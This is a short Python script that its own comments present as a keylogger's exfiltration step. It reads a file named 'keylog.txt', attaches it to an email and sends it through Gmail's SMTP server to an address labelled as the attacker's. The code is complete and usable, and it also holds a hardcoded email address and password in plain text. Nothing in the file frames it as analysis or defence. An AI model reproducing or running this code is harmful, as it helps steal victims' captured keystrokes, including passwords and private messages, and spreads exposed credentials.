#!/usr/bin/env python3
# import statements
import smtplib
from email import encoders
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase

# keylog file being sent to attacker
files_to_send = [
    "keylog.txt",
]


def send_mail(email, password, TO, msg):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, TO, msg.as_string())
    server.quit()

# change these to attacker email/password
email = "keyloggtester4@gmail.com"
password = "Kalibox123?"

TO   = "keyloggtester4@gmail.com"
subject = "subject"

# edit the text field and insert a document to be the body of the email
msg = MIMEMultipart()
msg["From"] = email
msg["To"] = TO
msg["Subject"] = subject
text = ""
msg.attach(MIMEText(text, "plain"))

for file in files_to_send:
    with open(file, "rb") as f:
        data = f.read()
        attach_part = MIMEBase("application", "octet-stream")
        attach_part.set_payload(data)
    encoders.encode_base64(attach_part)
    attach_part.add_header("Content-Disposition", f"attachment; filename= {file}")
    msg.attach(attach_part)

send_mail(email, password, TO, msg)
